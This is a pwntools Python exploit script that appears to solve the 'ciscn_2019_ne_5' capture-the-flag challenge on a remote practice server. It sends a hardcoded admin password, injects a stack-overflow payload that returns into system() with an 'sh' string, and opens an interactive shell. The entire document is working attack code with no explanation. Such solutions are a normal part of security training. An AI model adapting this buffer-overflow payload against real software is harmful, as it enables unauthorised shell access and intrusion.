from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29145)
elf = ELF('./ciscn_2019_ne_5')
system_addr = elf.symbols['system']
sh_addr = 0x80482ea # ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"
exit_addr = elf.symbols['exit']
io.sendlineafter(b'Please input admin password:', 'administrator')
payload = b'a'*(0x48+0x4) + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
io.sendlineafter(b'Exit\n:', '1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'Exit\n:', '4')
io.interactive()